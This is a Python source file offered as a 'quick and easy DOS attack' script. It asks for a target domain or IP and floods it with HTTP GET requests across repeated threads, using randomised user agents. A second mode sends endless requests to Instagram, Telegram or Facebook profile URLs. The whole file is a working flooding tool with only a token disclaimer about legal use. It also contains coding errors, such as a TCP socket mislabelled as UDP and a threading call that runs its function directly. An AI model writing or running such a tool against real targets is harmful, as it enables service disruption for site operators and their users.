#!/bin/python3
# -*- coding: utf-8 -*-

"""
Coded by parsa kazazi
@parsa_kazazi (Github, Twitter)

Quick and easy DOS attack python3 script
Works on all operating systems
For legal activities only
Version: 1.0
"""

import sys
import os
import socket
import urllib.request
import threading
import time
import random

os_name = os.name

if (os_name == "nt"):
    os.system("cls")
    os.system("title DOS Attack")
else:
    os.system("clear")
    os.system("printf '\033]2;DOS Attack\a'")

print("""
    Quick and easy DOS attack (Daniel Of Service)
    \033[91m
    WARNING : This script was created for security testing and simulate a cyber attack.
    Improper use and attacking targets without prior mutual consent is illegal!\033[0m
""")

def main():
    user_agents = [
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
        "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
        "Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
        "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
        "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
        "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
        "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
        "Opera/9.20 (Windows NT 6.0; U; en)",
        "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
        "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
        "Roku4640X/DVP-7.70 (297.70E04154A)",
        "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
        "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
        "AppleTV6,2/11.1",
        "AppleTV5,3/9.1.1",
        "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
        "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2",
        "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
        "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
        "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
    ]
    question = str("\033[94m[?]\033[0m ")
    info = str("\033[94m[i]\033[0m ")
    good = str("\033[92m[+]\033[0m ")
    error = str("\033[91m[-]\033[0m ")
    print("\nSelect Attack mode\n\n    1- Domain or IP address (UDP packet send)\n    2- Social media bot (http request send)\n")
    attack_modes = ["1", "2"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # to create connection
    attack_mode = input(question + "Attack mode : ")
    if (attack_mode not in attack_modes):
        print(error + "Invailed input")
        sys.exit(0)
    elif (attack_mode == "1"):
        address = input(question + "Doamin or IP address : ")
        udp_port = input(question + "UDP port (Enter to default 80) : ")
        thread_count = input(question + "Turbo count : ")
        if (udp_port == ""):
            udp_port = 80
        try:
            thread_count = int(thread_count)
            udp_port = int(udp_port)
        except ValueError:
            print(error + "Invailed input")
            sys.exit(0)
        try:
            ip = socket.gethostbyname(address) # get Website IP address by domain
        except socket.gaierror:
            print(error + address + " : Name or service not known")
            sys.exit(0)
        print(info + "Checking connection to " + address + " port " + str(udp_port) + " ...")
        time.sleep(3)
        try:
            sock.connect((ip, int(udp_port))) # check the connection
            sock.settimeout(1)
        except socket.error:
            print(error + "Connection failed")
            sys.exit(0)
        except socket.gaierror:
            print(error + address + " : Name or service not known")
            sys.exit(0)
        else:
            time.sleep(1)
            print(good + "Connected")
        time.sleep(2)
        if (os_name == "nt"):
            os.system("cls")
        else:
            os.system("clear")
        print(info + "Target IP address ......: " + ip)
        print(info + "Target UDP port ........: " + str(udp_port))
        print(info + "Attack turbo count .....: " + str(thread_count))
        input("\n" + good + "Press Enter to continue ")
        print(info + "For stop attack press CTRL+C\n")
        time.sleep(5)
        if (os_name == "nt"):
            os.system("title Attacking to " + address)
        else:
            os.system("printf '\033]2;Attacking to " + address + "\a'")
     
    elif (attack_mode == "2"):
        print("\nSelect social media")
        print("\n    1- Instagram\n    2- Telegram\n    3- Facebook\n")
        social_media_list = ["1", "2", "3"]
        social_media = input(question + ": ")
        if (social_media not in social_media_list):
            print(error + "Invailed input")
            sys.exit(0)
        bot_username = input(question +"Bot username account : ")
        thread_count = input(question + "Thread count : ")
        try:
            thread_count = int(thread_count)
        except ValueError:
            print(error + "Invailed input")
            sys.exit(0)
        udp_port = 80
        if (social_media == "1"):
            url = str("http://instagram.com/" + bot_username)
            social_media = "Instagram"
        elif (social_media == "2"):
            url = str("http://telegram.me/" + bot_username)
            social_media = "Telegram"
        elif (social_media == "3"):
            url = str("http://facebook.com/" + bot_username)
            social_media = "Facebook"
        print(info + "Checking connection to " + url + " ...")
        time.sleep(3)
        try:
            urllib.request.urlopen(url) # connect to bot url
        except socket.gaierror:
            print(error + "Name or service not known\n")
            sys.exit(0)
        except urllib.error.URLError:
            print(error + "URL Error\n")
            sys.exit(0)
        except urllib.error.HTTPError:
            print(error + "HTTP Error\n")
            sys.exit(0)
        except ConnectionError:
            print(error + "Connection Error\n")
            sys.exit(0)
        except ConnectionRefusedError:
            print(error + "Connection Refused\n")
            sys.exit(0)
        except ConnectionAbortedError:
            print(error + "Connection Aborted\n")
            sys.exit(0)
        except ConnectionResetError:
            print(error + "Connection Reset\n")
            sys.exit(0)
        else:
            time.sleep(1)
            print(good + "Connected")
        time.sleep(2)
        if (os_name == "nt"):
            os.system("cls")
        else:
            os.system("clear")
        print(info + "Bot username ...........: " + bot_username)
        print(info + "Social media ...........: " + social_media)
        print(info + "Full bot url ...........: " + url)
        print(info + "Attack turbo count .....: " + str(thread_count))
        input("\n" + good + "Press Enter to continue ")
        print(info + "For stop attack press CTRL+C\n")
        time.sleep(5)
        if (os_name == "nt"):
            os.system("title Attacking to " + bot_username)
        else:
            os.system("printf '\033]2;Attacking to " + bot_username + "\a'")

    def packet_send():
        # send packet to ip address
        while True:
            packet = str("""
GET / HTTP/1.1
Host: """ + address + """
Connection: keep-alive
User-Agent: """ + str(random.choice(user_agents)) + """
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Accept-Language: en-US,en;q=0.9

""")
            try:
                now_time = str(time.strftime("%Y-%m-%d %H:%M:%S"))
                if (sock.sendto(bytes(packet, "UTF-8"), (ip, int(udp_port)))):
                    print(good + now_time + " ==> Packet Sent to " + ip + ":" + str(udp_port))
                else:
                    sock.shutdown()
                    print(error + now_time + " ==> Shut down")
            # network errors exception
            except socket.error:
                print(error + now_time + " ==> Connection Error")
            except ConnectionError:
                print(error + now_time + " ==> Connection Error")
            except ConnectionRefusedError:
                print(error + now_time + " ==> Connection Refused")
            except ConnectionAbortedError:
                print(error + now_time + " ==> Connection Aborted")
            except ConnectionResetError:
                print(error + now_time + " ==> Connection Reset")
    
    def request_send():
        # send request to bot url
        while True:
            try:
                now_time = str(time.strftime("%Y-%m-%d %H:%M:%S"))
                if (urllib.request.urlopen(url)):
                    print(good + now_time + " ==> Request sent to " + str(url))
                else:
                    sock.shutdown()
                    print(error + now_time + " ==> Shut down")
            # network errors exception
            except socket.error:
                print(error + now_time + " ==> Connection Error")
            except urllib.error.HTTPError:
                print(error + now_time + " ==> HTTP Error")
            except ConnectionError:
                print(error + now_time + " ==> Connection Error")
            except ConnectionRefusedError:
                print(error + now_time + " ==> Connection Refused")
            except ConnectionAbortedError:
                print(error + now_time + " ==> Connection Aborted")
            except ConnectionResetError:
                print(error + now_time + " ==> Connection Reset")
    
    def attack():
        if (attack_mode == "1"):
            while True:
                for i in range(int(thread_count)):
                    try:
                        threading._start_new_thread(packet_send())
                    except KeyboardInterrupt:
                        yes_or_no = input(question + "Exit attack? (y/n) : ")
                        if (yes_or_no == "y"):
                            sys.exit(0)
                        elif (yes_or_no == "n"):
                            attack()
                        elif (yes_or_no == "Y"):
                            sys.exit(0)
                        elif (yes_or_no == "N"):
                            attack()
                        else:
                            print(info + "Aborted\n")
                            sys.exit(0)
        elif (attack_mode == "2"):
            while True:
                for i in range(int(thread_count)):
                    try:
                        threading._start_new_thread(request_send())
                    except KeyboardInterrupt:
                        yes_or_no = input(question + "Exit attack? (y/n) : ")
                        if (yes_or_no == "y"):
                            sys.exit(0)
                        elif (yes_or_no == "n"):
                            attack()
                        elif (yes_or_no == "Y"):
                            sys.exit(0)
                        elif (yes_or_no == "N"):
                            attack()
                        else:
                            print(info + "Aborted\n")
                            sys.exit(0)
    
    attack()

main()